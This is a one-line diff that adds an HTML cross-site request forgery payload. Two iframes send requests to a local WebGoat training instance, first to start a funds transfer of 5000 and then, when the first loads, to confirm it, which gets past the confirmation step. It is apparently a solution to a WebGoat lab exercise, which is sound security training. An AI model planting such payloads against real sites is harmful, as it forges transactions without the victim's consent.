@@ -1,0 +1,1 @@
+<iframe src="http://localhost:1079/WebGoat/attack?Screen= 1471017872&menu=900&transfer=5000" frameborder="1" width="800" scrolling=yes height="300" onload="document.getElementById('Second').src='http://localhost:1079/WebGoat/attack?Screen= 1471017872&menu=900&transfer=CONFIRMED';"></iframe><iframe id="Second" frameborder="1" width="800" scrolling=yes height="300"></iframe>
